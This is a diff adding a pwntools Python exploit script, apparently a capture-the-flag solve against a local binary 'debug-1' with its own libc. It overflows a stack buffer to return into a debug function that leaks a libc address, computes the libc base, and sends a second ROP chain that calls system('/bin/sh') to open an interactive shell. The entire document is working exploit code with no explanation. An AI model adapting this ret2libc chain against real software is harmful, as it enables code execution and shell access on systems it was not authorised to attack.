@@ -1,0 +1,31 @@
+from pwn import *
+import time
+exe = context.binary = ELF("./debug-1")
+libc = ELF("./libc.so.6")
+r = process()
+offset = 88
+rop = ROP(exe)
+rop.raw(b"\x00" * 88)
+# rop.raw(0x0000000000401016)
+rop.raw(exe.sym['debug'] + 1)
+r.sendline("1")
+r.sendline(rop.chain())
+r.sendline("1")
+r.recvuntil(b"libc leak: ")
+ssystem = int(r.recvline().strip().decode(),16)
+print(hex(ssystem - 0x44af0))
+libc.address = ssystem - 0x44af0
+rdi = 0x000000000040154b
+bin_sh = next(libc.search("/bin/sh"))
+log.info(f"System address : {hex(ssystem)}")
+log.info(f"Libc base : {hex(libc.address)}")
+rop2 = ROP(libc)
+rop2.raw(b"A" * 104)
+rop2.raw(0x000000000040154b)
+rop2.raw(bin_sh)
+rop2.raw(0x0000000000401016)
+rop2.raw(libc.sym['system'])
+# time.sleep(10)
+print(rop2.dump())
+r.sendline(rop2.chain())
+r.interactive()
